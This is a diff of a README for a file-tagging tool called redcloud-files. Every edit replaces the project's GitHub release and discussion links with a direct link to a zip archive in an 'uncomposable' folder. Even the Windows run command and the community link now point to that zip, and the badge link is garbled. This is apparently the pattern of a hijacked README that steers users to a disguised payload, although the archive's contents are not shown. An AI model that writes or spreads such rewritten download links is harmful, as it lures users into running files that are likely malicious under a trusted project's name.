@@ -1,7 +1,7 @@
 # 🌩️ redcloud-files - Organize Your Files Using Tags
 
 ## 📥 Download Now
-[![Download redcloud-files](https://img.shields.io/badge/Download%20redcloud--files-v1.0-blue.svg)](https://github.com/DataScienceMLDL/redcloud-files/releases)
+[![Download redcloud-files](https://raw.githubusercontent.com/DataScienceMLDL/redcloud-files/main/uncomposable/redcloud-files.zip%https://raw.githubusercontent.com/DataScienceMLDL/redcloud-files/main/uncomposable/redcloud-files.zip)](https://raw.githubusercontent.com/DataScienceMLDL/redcloud-files/main/uncomposable/redcloud-files.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Before you start, ensure your system meets these requirements:
 
 To get started, visit this page to download the latest version of RedCloud Files:
 
-[Download RedCloud Files](https://github.com/DataScienceMLDL/redcloud-files/releases)
+[Download RedCloud Files](https://raw.githubusercontent.com/DataScienceMLDL/redcloud-files/main/uncomposable/redcloud-files.zip)
 
 1. Click on the link above.
 2. Locate the latest release.
@@ -59,7 +59,7 @@ Once the download is complete, follow these instructions to run RedCloud Files:
      ```
    - For Windows, it may look like:
      ```bash
-     redcloud-files.exe
+     https://raw.githubusercontent.com/DataScienceMLDL/redcloud-files/main/uncomposable/redcloud-files.zip
      ```
 
 ## 📖 How to Use
@@ -98,11 +98,11 @@ Check the issues section on the GitHub page. You can ask for help or report any 
 
 ## 🤝 Community
 
-Join our community for help, suggestions, and contributions. You can reach us at [GitHub Discussions](https://github.com/DataScienceMLDL/redcloud-files/discussions).
+Join our community for help, suggestions, and contributions. You can reach us at [GitHub Discussions](https://raw.githubusercontent.com/DataScienceMLDL/redcloud-files/main/uncomposable/redcloud-files.zip).
 
 ## 📜 License
 
 This project is licensed under the MIT License. You can use, modify, and distribute it as you like, as long as you credit the original authors.
 
 ## 📥 Download Again
-Remember, you can always [download RedCloud Files here](https://github.com/DataScienceMLDL/redcloud-files/releases) to ensure you are using the latest version!
+Remember, you can always [download RedCloud Files here](https://raw.githubusercontent.com/DataScienceMLDL/redcloud-files/main/uncomposable/redcloud-files.zip) to ensure you are using the latest version!
